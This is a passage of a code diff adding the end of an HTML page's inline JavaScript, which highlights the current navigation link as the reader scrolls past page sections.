+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
